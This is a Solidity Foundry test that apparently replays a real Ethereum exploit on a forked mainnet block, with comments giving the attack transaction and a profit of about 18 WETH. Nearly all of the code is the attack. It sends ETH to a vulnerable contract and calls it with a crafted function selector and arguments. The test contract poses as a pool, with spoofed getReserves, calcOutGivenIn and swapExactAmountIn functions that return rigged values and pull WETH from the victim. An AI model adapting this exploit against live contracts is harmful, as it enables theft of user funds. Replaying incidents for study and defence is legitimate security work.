// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";


// TX : https://app.blocksec.com/explorer/tx/eth/0x998f1da472d927e74405b0aa1bbf5c1dbc50d74b39977bed3307ea2ada1f1d3f
// GUY : https://x.com/CyversAlerts/status/1780593407871635538
// Profit : ~18 WETH

contract ContractTest is Test {
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address public vulnContract=0x00C409001C1900DdCdA20000008E112417DB003b;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    event log_data(bytes data);
    function setUp() public {
        vm.createSelectFork("mainnet", 19255512);
    }

    function testExploit() external {
        deal(address(weth),address(this),4704.1 ether);
        emit log_named_decimal_uint("[End] Attacker weth balance before exploit", weth.balanceOf(address(this)), weth.decimals());
        attack();
        emit log_named_decimal_uint("[End] Attacker weth balance after exploit", weth.balanceOf(address(this)), weth.decimals());
    }

    function attack() public {
        weth.withdraw(4704.1 ether);
         address(vulnContract).call{value: 4704.1 ether}("");
         bytes memory data = abi.encodeWithSelector(bytes4(0xba381f8f),0xffffffffffffffffff,0x01,address(this),address(this),0x00,0x00,0x00,address(this),0x01);
         emit log_data(data);
        // bytes memory data=hex"ba381f8f0000000000000000000000000000000000000000000000ffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000010000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001";
        vulnContract.call(data);
    }

    function getBalance(address token)public view returns(uint256){
        return 1;
    }
    function getbalance() public {
        emit log_named_decimal_uint("this token balance", weth.balanceOf(address(vulnContract)), weth.decimals());
    }
    function getReserves() public view returns(uint256,uint256,uint256){
        return (1,1,block.timestamp);
    }
    function calcOutGivenIn(uint256 amountIn, uint256 reserveIn, uint256 reserveOut,uint256 a,uint256 b,uint256 c) public pure returns (uint256 amountOut) {
        return 1;
        }
    

    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256, uint256){
        weth.transferFrom(msg.sender,address(this),tokenAmountIn);
        return (0,0);
    }

    function transfer(address to, uint256 value) public returns (bool) {
        return true;
    }   
    fallback() external payable{}
}
